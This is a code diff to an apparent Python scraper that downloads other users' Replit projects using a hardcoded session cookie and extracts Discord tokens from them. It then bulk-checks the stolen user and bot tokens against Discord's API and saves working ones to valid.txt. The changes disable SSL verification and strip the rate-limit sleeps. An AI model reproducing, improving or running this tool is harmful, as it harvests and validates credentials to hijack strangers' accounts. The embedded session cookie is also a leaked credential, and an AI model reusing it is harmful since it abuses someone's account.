@@ -10,6 +10,7 @@ import ujson
 import uvloop
 from .request import RequestMaker
 from colorama import Fore as color
+import aiofiles
 
 
 uvloop.install()
@@ -48,7 +49,7 @@ class ReplIt:
             }
         ]
 
-        async with aiohttp.ClientSession() as session:
+        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True) as session:
             async with session.post(self.GRAPHQL, headers=self.GRAPHQL_HEADERS, json=json) as resp:
                 if resp.status == 200:
                     j = await resp.json()
@@ -78,7 +79,7 @@ class ReplIt:
             }
         ]
 
-        async with aiohttp.ClientSession() as session:
+        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True) as session:
             async with session.post(self.GRAPHQL, headers=self.GRAPHQL_HEADERS, json=json) as resp:
                 if resp.status == 200:
                     j = await resp.json()
@@ -107,7 +108,7 @@ class ReplIt:
                                     if len([fork['url'] for fork in forks]) > 0:
                                         urls += [fork['url'] for fork in forks]
                                         ids += [fork['id'] for fork in forks]
-                                        await asyncio.sleep(1)
+
                                     else:
                                         break
                                     if len(urls) >= int(count):
@@ -140,29 +141,21 @@ class ReplIt:
             "Cookie": "_anon_id=abf0f575-1c1c-4de7-bc67-7803533ea9b5; amplitudeSessionId=1658875018; connect.sid=s%3AMX1T-6foGoJBZ-vD4mai6zi3B5PP-__N.%2BikcOEv6Hxvjef1mdu3cBMV0SHttLuzNwL0Tf6rEDi8; replit:authed=1; replit_authed=1; replit_ng=1658875358.96.42.510323|8035451343a2d8f3e54599c71b2aec19; _dd_s=logs=1&id=71c9808c-aa51-4dbf-8dc1-ba183419d5a9&created=1658875018897&expire=1658876264927",
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.167 Safari/537.36"
         }
-        async with aiohttp.ClientSession() as session:
-        # In order to get zip we need to first somehow get the cookie thats related to being authenticated
-        # My balls hurt uwu
-            # async with session.get("https://replit.com", headers=headers) as resp:
-            #     if resp.status == 200:
-            #         cookie = resp.headers
+        async with aiohttp.ClientSession(headers=headers, connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True) as session:
 
-
-
-
-
-            async with session.get(f"https://replit.com{repl_url}.zip", headers=headers) as resp:
+            async with session.get(f"https://replit.com{repl_url}.zip") as resp:
                 if resp.status == 200:
                     j = await resp.read()
-                    with open(f'./resources/data/{repl_id}.zip', 'wb') as f:
-                        f.write(j)
+                    async with aiofiles.open(f'./resources/data/{repl_id}.zip', 'wb') as f:
+                        await f.write(j)
+                        await aprint(f"{color.GREEN}Finished downloading zip{color.RESET}")
                 else:
                     j = await resp.text()
                     await aprint(f"{color.RED}{resp.status}{color.RESET}")
 
     async def search_zip(self, repl_id: str):
         tokens = []
-        folder = "./resources/data"
+        folder = "./resources/data/extracter"
         with zipfile.ZipFile(f'./resources/data/{repl_id}.zip', 'r') as zip_ref:
             zip_ref.extractall(folder)
         for root, dirs, files in os.walk(folder):
@@ -177,7 +170,6 @@ class ReplIt:
                     file_txt.close()
                 except:
                     continue
-
         for filename in os.listdir(folder):
             file_path = os.path.join(folder, filename)
             try:
@@ -187,10 +179,23 @@ class ReplIt:
                     shutil.rmtree(file_path)
             except Exception as e:
                 await aprint(f'{color.RED}Failed to delete %s. Reason: %s{color.RESET}' % (file_path, e))
+
         return tokens
 
+    async def clean_dirs(self):
+        folder = "./resources/data"
+        for filename in os.listdir(folder):
+            file_path = os.path.join(folder, filename)
+            try:
+                if os.path.isfile(file_path) or os.path.islink(file_path):
+                    os.unlink(file_path)
+                elif os.path.isdir(file_path):
+                    shutil.rmtree(file_path)
+            except Exception as e:
+                await aprint(f'{color.RED}Failed to delete %s. Reason: %s{color.RESET}' % (file_path, e))
+
     async def repl_scrape(self):
-        async with aiohttp.ClientSession() as session:
+        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True) as session:
             new_json = [
                 {
                     "operationName":"ReplPostsFeed",
@@ -270,10 +275,10 @@ class ReplIt:
                     resp = await rm.request_pool([{"method":"get", "url":"https://discord.com/api/v9/users/@me/library", "headers":{"authorization":f"{token}"}}for token in tokens[i:i+500]])
                     resp = await rm.response_pool_status_sync(resp)
                     for index, status in enumerate(resp):
-                        with open('valid.txt', 'a') as f:
+                        async with aiofiles.open('valid.txt', 'a') as f:
                             if status == 200:
                                 await aprint(f"{color.GREEN}Token number {index+1} is fully working user token! --- {tokens[index]}{color.RESET}")
-                                f.write(f"{tokens[index]}\n")
+                                await f.write(f"{tokens[index]}\n")
                             elif status == 403:
                                 await aprint(f"{color.RED}Token number {index+1} is account locked in some way{color.RESET}")
                             elif status == 429:
@@ -291,10 +296,10 @@ class ReplIt:
             # print(results)
             resp = await rm.response_pool_status_sync(resp)
             for index, status in enumerate(resp):
-                with open('valid.txt', 'a') as f:
+                async with aiofiles.open('valid.txt', 'a') as f:
                     if status == 200:
                         await aprint(f"{color.GREEN}Token number {index+1} is fully working user token! --- {tokens[index]}{color.RESET}")
-                        f.write(f"{tokens[index]}\n")
+                        await f.write(f"{tokens[index]}\n")
                     elif status == 403:
                         await aprint(f"{color.RED}Token number {index+1} is account locked in some way{color.RESET}")
                     elif status == 429:
@@ -314,10 +319,10 @@ class ReplIt:
                     resp = await rm.request_pool([{"method":"get", "url":'https://canary.discordapp.com/api/v9/users/@me', "headers":{"authorization": f'Bot {token}'}}for token in tokens[i:i+500]])
                     resp = await rm.response_pool_status_sync(resp)
                     for index, status in enumerate(resp):
-                        with open('valid.txt', 'a') as f:
+                        async with aiofiles.open('valid.txt', 'a') as f:
                             if status == 200:
                                 await aprint(f"{color.GREEN}Token number {index+1} is fully working bot token! --- {tokens[index]}{color.RESET}")
-                                f.write(f"{tokens[index]}\n")
+                                await f.write(f"{tokens[index]}\n")
                             elif status == 403:
                                 await aprint(f"{color.RED}Token number {index+1} is account locked in some way{color.RESET}")
                             elif status == 429:
@@ -334,10 +339,10 @@ class ReplIt:
             # print(results)
             resp = await rm.response_pool_status_sync(resp)
             for index, status in enumerate(resp):
-                with open('valid.txt', 'a+') as f:
+                async with aiofiles.open('valid.txt', 'a+') as f:
                     if status == 200:
                         await aprint(f"{color.GREEN}Token number {index+1} is fully working bot token! --- {tokens[index]}{color.RESET}")
-                        f.write(f"{tokens[index]}\n")
+                        await f.write(f"{tokens[index]}\n")
                     elif status == 403:
                         await aprint(f"{color.RED}Token number {index+1} is account locked in some way{color.RESET}")
                     elif status == 429:
@@ -347,7 +352,7 @@ class ReplIt:
                     else:
                         await aprint(f"{color.RED}Black magic occurred -- {status} -- {index+1}{color.RESET}")
 
-            await asyncio.sleep(2)
+
 
 
 
